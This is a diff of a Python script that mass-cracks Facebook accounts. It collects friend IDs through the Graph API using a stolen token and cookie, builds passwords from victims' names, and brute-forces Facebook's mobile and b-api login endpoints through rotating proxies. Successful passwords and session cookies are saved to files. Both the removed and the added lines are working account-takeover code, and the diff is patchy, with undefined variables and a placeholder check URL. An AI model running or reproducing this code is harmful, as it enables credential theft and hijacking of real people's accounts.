-				if cih<100:
-					nom = ''+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n CHOOSE : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' SELECT RIGHT OPTION ')
-				exit()
-			try:lin = open('OK/'+geh,'r').read().splitlines()
-			except:
-				print('File Not Found ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="green")
-				nocp +=1
-			input('[ CLICK ENTER 2 BACK ]')
-			back()
-	elif kz in ['0','00']:
-		back()
-	else:
-		print('SELECT RIGHT OPTION ')
-		exit()
- 
-def public():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		os.system('clear')
-		banner()
-		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
-	except ValueError:
-		
-		back()
-	if jum<1 or jum>100000000:
-		
-		back()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(' [] INPUT ID '+str(yz)+': ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('#TRY AGAIN ')
-			os.system('clear')
-	try:
-		print(f' [] TOTAL ID: {P}'+str(len(id)))
-		print('')
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{u}')
-		back()
-	except (KeyError,IOError):
-		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
-		time.sleep(3)
-		back()
-		
-def crack_file():
-	os.system('clear')
-	banner()
-	os.system('espeak -a 300 " your file name"')
-	print('\033[1;32m [Put File Example:  /sdcard/SHANTO.txt  Etc...]')
-	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
-	print('')
-	try:lin = open(o).read().splitlines()
-	except:
-		print('File Not Found')
-		time.sleep(2)
-		back()
-	for xid in lin:
-		id.append(xid)
-	setting()
-	
-def setting():
-	hu = '3'
-	if hu in ['1','01']:
-		for tua in sorted(id):
-			id2.append(tua)
-	elif hu in ['2','02']:
-		muda=[]
-		for bacot in sorted(id):
-			muda.append(bacot)
-		bcm=len(muda)
-		bcmi=(bcm-1)
-		for xmud in range(bcm):
-			id2.append(muda[bcmi])
-			bcmi -=1
-	elif hu in ['3','03']:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	else:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD RJ.. ')
-	os.system('espeak -a 300 " 1,  method,  RJ"')
-	hc = input(' CHOOSE: ')
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['9','09']:
-		method.append('mbasic')
-	else:
-		method.append('mobile')
-	passwrd()
-	exit()
- 
-def passwrd():
-	os.system('clear')
-	banner()
-	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	SHANTOj(f'\033[0;97m===============================================')
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-					
-				pool.submit(crack,idf,pwv)
-	print('')
-	SHANTOj('==========================================')
-	SHANTOj('CLONING COMPLETE .......... ')
-	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
-	input('CLICK ENTER TO EXIT ')
-		
-def crack(idf,pwv):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[SHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}[{h}• Ok {P}{bo}{ok}{P}] "),
-	sys.stdout.flush()
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				#SHANTO-King
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
-				os.system('espeak -a 300 " C,  P"')
-			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
+					print(f'\r\r{S}[TONMOY-LK] '+iid+' | '+psw+f'{W}')
+					lk.append(id)
+					open('/sdcard/TKM/LOCK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/LOCK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/LOCK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
+					break
+				if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}'+coki+f'{E}');print(f"{W}{40*'-'}{E}")
 				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
-				print('\033[0;94m===============================================')
-				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
-				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
-				cek_apk(session,coki)
+			elif twfx in str(logx):
+				try:iid = logx['error']['error_data']['uid']
+				except:iid=id
+				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
+				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
+				cp.append(id)
 				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-	#----------------------------------------------#
-if __name__=='__main__':
-	try:os.system('git pull')
-	except:pass
-	try:os.system('touch prox.txt')
-	except:pass
-	
-login()
+			else:continue
+	except requests.exceptions.ConnectionError:time.sleep(10)
+	lop+=1
+############------[METHOD-2-B]-------#########
+def api(id,psd,name):
+	os.system('xdg-open https://facebook.com/groups/2470754783080486/')
+	try:
+		global ok,cp,twf,lop
+		fn = name.split(' ')[0]
+		try:ln = name.split(' ')[1]
+		except:ln = fn
+		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
+		for pxw in psd:
+			psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
+			ua="[FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
+			url = 'https://b-api.facebook.com/method/auth.login'
+			headerx={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':ua,'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
+			datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_cookies':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
+			lo = requests.post(url,data=datax,headers=headerx,allow_redirects=False).text
+			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+			logx = json.loads(lo)
+			if 'session_key' in logx:
+				try:iid = str(logx['uid'])
+				except:iid=id
+				check = requests.get(f"xd").text
+				coki=f"xr={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(lo)["session_cookies"])
+				if 'LIVE' in check:
+					print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')
+					ok.append(id)
+					open('/sdcard/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
+					break
+				else:
+					print(f'\r\r{S}[TONMOY-LK] '+iid+' | '+psw+f'{W}')
+					lk.append(id)
+					open('/sdcard/TKM/LOCK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/LOCK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/LOCK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
+					break
+				if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}'+coki+f'{E}');print(f"{W}{40*'-'}{E}")
+				break
+			elif twfx in str(logx):
+				try:iid = logx['error']['error_data']['uid']
+				except:iid=id
+				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
+				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
+				cp.append(id)
+				break
+			else:continue
+	except requests.exceptions.ConnectionError:time.sleep(10)
+	lop+=1
+##################
+try:YF()
+except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
+except:exit()
